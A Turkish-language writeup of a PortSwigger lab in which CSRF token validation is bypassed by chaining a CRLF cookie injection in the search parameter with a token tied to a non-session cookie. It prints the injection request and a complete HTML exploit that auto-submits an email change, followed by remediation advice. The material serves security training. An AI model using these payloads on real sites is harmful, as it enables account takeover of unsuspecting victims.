# CSRF Where Token Is Tied to a Non-Session Cookie — Writeup

**Platform:** PortSwigger Web Security Academy
**Tarih:** 2026-11-06

---

## Executive Summary

- **Hedef:** `https://<lab-id>.web-security-academy.net/` (PortSwigger lab)
- **Zorluk:** Zor (Expert)
- **Tespit Edilen Zafiyet:** CSRF — token bir `csrfKey` cookie'sine bağlı, ama bu cookie kullanıcı oturumuna bağlı değil + arama fonksiyonunda CRLF/cookie injection
- **Genel Etki:** Saldırgan kendi token+csrfKey çiftini kurbanın tarayıcısına yerleştirip e-posta değiştirme CSRF'i gerçekleştirebilir
- **Durum:** Tamamlandı — iki aşamalı exploit (cookie injection + form submit) teslim edildi, lab çözüldü

---

## Reconnaissance & Enumeration

İki ayrı mekanizma tespit edildi:

**1. Change-email token mekanizması:**
```
POST /my-account/change-email
email=...&csrf=<token>
Cookie: session=...; csrfKey=<key>
```
CSRF token (`csrf`) ayrı bir `csrfKey` cookie'sine bağlı. İkisi eşleşen çift olarak doğrulanıyor.

**2. Arama fonksiyonu — cookie yansıması:**
```
GET /?search=merhaba
→ Set-Cookie: LastSearchTerm=merhaba; Secure; HttpOnly
```
Arama terimi doğrudan bir `Set-Cookie` header'ına yansıyor — cookie injection potansiyeli.

---

## Vulnerability Analysis

İki zafiyetin birleşimi:

1. **Token oturuma bağlı değil (sadece csrfKey'e bağlı):** Sunucu "token ↔ csrfKey eşleşiyor mu?" diye bakıyor ama "bu csrfKey bu oturuma mı ait?" diye bakmıyor. Yani saldırganın kendi (eşleşen) token+csrfKey çifti, kurbanın oturumunda kabul ediliyor.

2. **CRLF / cookie injection (arama fonksiyonu):** Arama terimi `Set-Cookie` değerine sanitize edilmeden yansıdığı için, `%0d%0a` (CRLF) ile response header'ı bölünüp **ikinci bir `Set-Cookie: csrfKey=...`** enjekte edilebiliyor.

Bu ikisi birleşince: saldırgan, cookie injection ile kendi csrfKey'ini kurbanın tarayıcısına set edip, eşleşen token'ı formda göndererek CSRF'i tamamlar.

---

## Exploitation

### 1. Eşleşen çift elde etme
Change-email sayfası **tek bir yüklemede** eşleşen bir `csrfKey` (cookie) + `csrf` (token) çifti üretir. İkisi birlikte, aynı yüklemeden alındı. (Token oturuma bağlı olmadığı için bu çift kurbanın oturumunda da geçerli.)

### 2. Cookie injection doğrulaması (Repeater)
```
GET /?search=x%0d%0aSet-Cookie:%20csrfKey=<key>
```
Response'ta iki `Set-Cookie` satırı göründü (LastSearchTerm + enjekte edilen csrfKey) → CRLF injection çalışıyor.

### 3. İki aşamalı exploit

```html
<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="<csrf-token>">
</form>
<img src="https://<lab-id>.web-security-academy.net/?search=x%0d%0aSet-Cookie:%20csrfKey=<csrfKey>%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

Akış:
1. `<img>` search URL'ine GET atar (tarayıcı img'yi otomatik GET ile çeker)
2. Sunucu CRLF injection yüzünden `Set-Cookie: csrfKey=<saldırgan değeri>` döner → **kurbanın tarayıcısına csrfKey kurulur**
3. img bir HTML döndürdüğü için görsel olarak yüklenemez → `onerror` tetiklenir
4. `onerror` formu submit eder → change-email'e POST, kurbanın session'ı + enjekte csrfKey + eşleşen token birlikte gider
5. Sunucu token↔csrfKey eşleşmesini doğrular (ikisi de saldırganın çifti) → kabul → kurbanın e-postası değişir

### 4. Teslimat
Exploit server'a yüklendi (File: `/exploit`), **Store** → **View exploit** (kendi test) → **Deliver to victim** → lab çözüldü.

---

## Remediation (Çözüm Önerileri)

- **Token oturuma bağlanmalı:** CSRF token, kullanıcının session'ı ile ilişkilendirilmeli; ayrı bir cookie'ye değil.
- **Entegre framework:** Session yönetimi ve CSRF koruması aynı, entegre mekanizmayı kullanmalı (ayrı framework'ler token'ı yanlış cookie'ye bağlar).
- **CRLF injection engelleme:** Kullanıcı girdisi (arama terimi) response header'ına yazılmadan önce satır sonu karakterleri (`\r`, `\n`) strip/encode edilmeli.
- **SameSite:** Cookie'ler uygun SameSite ile korunmalı (cross-site enjeksiyonu zorlaştırır).

---

## Gotchas (Dikkat Edilecekler)

- **Tek form = tek istek.** Cookie injection ve form submit AYRI iki istek — ikisini tek forma koyamazsın. `<img>` (cookie set) + `<form>` (change-email) ayrı elementler olmalı. (İlk taslakta bu karıştı.)
- **csrfKey = cookie, csrf = token.** csrfKey cookie injection ile kurulur; csrf forma elle konur. İkisi **aynı yüklemeden** gelen **eşleşen çift** olmalı.
- **Çift sayfa yüklendiğinde üretilir, submit'te değil** — ve yeniden yükleyince değişir. Çifti tek seferde yakala, yenileme.
- **SameSite=None şart:** Enjekte edilen csrfKey'in cross-site form submit'inde (exploit server→lab) kurbanla gitmesi için. Lax/Strict olsa gönderilmezdi.
- **img otomatik GET atar** — metod belirtmezsin. img'nin amacı search isteğini tetiklemek; cookie'yi set eden, o GET'e dönen Set-Cookie response'u.
- **`onerror` sıralama için:** img bir HTML (görsel değil) döndürür → yüklenemez → onerror → form submit. Böylece önce csrfKey kurulur, sonra form gider.
- **URL encoding:** `%0d%0a`=CRLF (header böler), `%20`=boşluk, `%3b`=`;` (cookie ayracı).
- **img etiketini kapat (`>`).** Eksik `>` tüm exploit'i bozar — en son takıldığımız nokta buydu.
- **Domain tam olmalı:** `<lab-id>.web-security-academy.net` — sadece ID yetmez.

---

## Zincir Mantığı

Bu lab, iki zafiyetin **zincirlenmesiyle** çözülür — tek başına hiçbiri yeterli değil:
- Sadece "token oturuma bağlı değil" → yine de csrfKey'i kurbana koyman lazım
- Sadece "cookie injection" → neyi enjekte edeceğini (eşleşen csrfKey) bilmen lazım

İkisi birleşince: cookie injection, eşleşen çiftin csrfKey ayağını kurbana taşır; token ayağı formda gider; token oturuma bağlı olmadığı için kabul edilir. Gerçek pentest'te zafiyetler böyle zincirlenir — tek tek zayıf, birlikte kritik.
